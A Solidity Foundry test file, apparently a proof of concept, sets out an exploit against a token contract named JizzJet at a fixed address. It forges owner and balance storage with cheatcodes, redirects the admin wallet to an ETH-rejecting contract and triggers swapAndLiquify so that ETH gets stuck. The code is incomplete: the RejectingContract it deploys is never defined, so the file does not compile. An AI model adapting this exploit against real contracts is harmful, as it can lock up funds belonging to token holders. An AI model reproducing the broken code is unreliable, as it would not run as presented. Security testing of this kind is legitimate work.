pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

interface IJizzJet {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function _adminWalletAddress() external view returns (address payable);
    function _setReceiverWallet(address payable adminWalletAddress) external;
    function swapAndLiquifyEnabled() external view returns (bool);
    function owner() external view returns (address);
    function uniswapV2Router() external view returns (IUniswapV2Router02);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
    function balanceOf(address) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xF2A7429641d1b49a13dCB7E23b67a1a5101231F2;
    address attacker = address(this);
    IJizzJet target;
    RejectingContract rejectingContract;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = IJizzJet(TARGET);
        rejectingContract = new RejectingContract();
        vm.label(TARGET, "JizzJet Contract");
        vm.label(address(rejectingContract), "Rejecting Contract");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Set owner to attacker using storage manipulation
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));

        // Step 2: Change admin to rejecting contract
        vm.startPrank(attacker);
        target._setReceiverWallet(payable(address(rejectingContract)));
        vm.stopPrank();

        // Step 3: Get WETH and tokens for seeding liquidity
        vm.deal(address(this), 10 ether);
        IWETH WETH = IWETH(target.uniswapV2Router().WETH());
        WETH.deposit{value: 5 ether}();

        // Step 4: Give attacker tokens via _rOwned mapping manipulation
        uint256 threshold = 100000000 * 10**1 * 10**9; // 1e18
        bytes32 rOwnedSlot = keccak256(abi.encode(attacker, uint256(1)));
        uint256 rAmount = threshold * 10 * 1e18; // Give plenty of tokens
        vm.store(TARGET, rOwnedSlot, bytes32(rAmount));

        // Step 5: Add initial liquidity to the pair
        vm.startPrank(attacker);
        target.approve(address(target.uniswapV2Router()), threshold * 5);
        IUniswapV2Router02 router = target.uniswapV2Router();
        router.addLiquidityETH{value: 5 ether}(
            TARGET,
            threshold * 5,
            0,
            0,
            attacker,
            block.timestamp + 1 hours
        );
        vm.stopPrank();

        // Step 6: Transfer tokens TO the target contract to trigger swapAndLiquify
        vm.startPrank(attacker);
        target.transfer(TARGET, threshold);
        vm.stopPrank();

        // Step 7: Check if ETH is stuck in contract (swap succeeded but admin transfer failed)
        assertGt(address(TARGET).balance, 0, "ETH should be stuck in contract");
    }





    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

